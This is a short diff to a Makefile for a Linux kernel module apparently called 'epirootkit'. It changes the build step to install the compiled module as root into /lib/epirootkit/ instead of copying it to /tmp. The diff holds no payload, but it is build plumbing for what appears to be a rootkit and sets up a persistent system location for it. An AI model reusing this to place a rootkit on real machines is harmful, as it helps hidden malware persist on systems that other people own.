@@ -53,7 +53,8 @@ all: modules
 modules:
 	@./scripts/generate.sh
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
-	@cp epirootkit.ko /tmp/epirootkit.ko
+	@mkdir -p /lib/epirootkit/
+	@install -o root -m 0644 epirootkit.ko /lib/epirootkit/epirootkit.ko
 
 clean:
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
